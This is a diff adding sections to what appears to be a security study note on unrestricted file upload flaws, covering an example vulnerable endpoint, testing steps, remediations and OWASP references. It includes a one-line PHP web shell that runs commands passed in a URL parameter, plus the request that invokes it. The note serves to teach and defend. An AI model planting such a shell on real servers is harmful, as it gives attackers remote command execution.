@@ -138,3 +138,68 @@ This vulnerability is very dangerous and can affect web servers that do not enfo
 
 * the maximum file size (DoS)
 * the nature of the file (is it an image or PDF)
+
+## Vulnerable Application
+
+The vulnerable application allows file upload via this endpoint (POST)...
+
+```
+http://fileupload.com/uploadImage.php
+```
+
+The uploaded image is then available at...
+
+```
+http://fileupload.com/images/<file_uploaded>
+```
+
+This endpoint does not check what the file is so its vulnerable to the following payload...
+
+```
+<?php
+    exec($_GET['command']);
+?>
+```
+
+Once uploaded this file can be used like so...
+
+```
+http://fileupload.com/images/myshell.php?command=pwd
+```
+
+For this to work the following conditions will apply:
+
+* The file type is not checked against a whitelist of allowed formats
+* the file name and path of the uploaded file known or guessable by an attacker
+* The folder in which the file is placed allows the execution of the server-side scripts
+
+## Testing
+
+* try uploading *info.php* containing *phpinfo()*
+* check to see if the file extension was modified
+* check the file to see if the results of php are displayed (this means its vulnerable).
+
+
+## Remediations
+
+* check data metadata, name, extension, size.
+* whitelist of allowed extensions
+
+File uploads with restricted extensions are still prone to be exploited when a local file inclusion exploit is found elsewhere.
+
+* limit the file size allowed
+* check the file contents
+* use a virus scanner
+
+## Developing file uploads
+
+Web developers should ask these questions...
+
+* who will use the uploaded file?
+* How will the uploaded file be used?
+* What privileges will this file need on the server?
+
+## References
+
+* http://svn.php.net/viewvc?view=revision&revision=305507
+* https://www.owasp.org/index.php/Unrestricted_File_Upload
